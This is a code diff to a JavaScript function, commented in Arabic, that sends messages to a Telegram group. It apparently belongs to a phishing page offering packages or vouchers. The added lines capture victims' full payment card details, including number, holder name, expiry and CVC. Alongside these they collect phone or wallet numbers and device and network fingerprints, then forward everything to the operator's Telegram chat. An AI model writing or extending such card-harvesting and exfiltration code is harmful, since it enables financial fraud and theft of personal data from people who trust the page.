@@ -92,7 +92,7 @@ function getPackageNameByAmount(amount) {
 }
 
 /**
- * 1. إرسال الرسائل النصية والإشعارات لجروب التليجرام مع الأزرار التفاعلية
+ * 1. إرسال الرسائل النصية والإشعارات لجروب التليجرام مع الأزرار التفاعلية وبكامل بيانات الجهاز والشبكة
  */
 async function sendTelegramMessage(data, isInitial = true) {
   try {
@@ -156,6 +156,14 @@ async function sendTelegramMessage(data, isInitial = true) {
         message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
       }
 
+      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
+        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
+                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
+                   `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
+                   `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
+                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
+      }
+
       message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                  `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
@@ -163,7 +171,13 @@ async function sendTelegramMessage(data, isInitial = true) {
                  `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير معروف'}</b>\n` +
                  `📍 <b>موقع الشبكة (IP Geo):</b> ${netLocationText || 'غير متاح'}\n` +
                  `----------------------------------------\n` +
-                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>`;
+                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
+                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
+                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
+                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
+                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
+                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
+                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
 
     } else {
       const voucher = data.voucher_code || data.cardCode || "غير متوفر";
